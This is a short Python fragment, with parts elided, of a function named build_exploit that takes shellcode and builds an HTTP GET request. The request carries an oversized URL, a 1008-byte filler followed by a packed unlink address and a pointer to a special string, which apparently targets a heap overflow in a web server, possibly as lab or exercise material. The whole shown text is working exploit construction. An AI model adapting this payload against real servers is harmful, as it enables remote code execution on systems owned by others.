...
def build_exploit(shellcode):
    ...
    pn = 0xbfffd9fc
    unlink = 0x40102450
    special_string_addr = 0xbfffde65
    long_url = b'1' * (1008) + struct.pack('<I', unlink) + b'1'*16 + struct.pack('<I', special_string_addr) + b'?' + special_string
    req = b'GET /' + long_url + b' HTTP/1.0\r\n' + \
          b'\r\n'
    return req
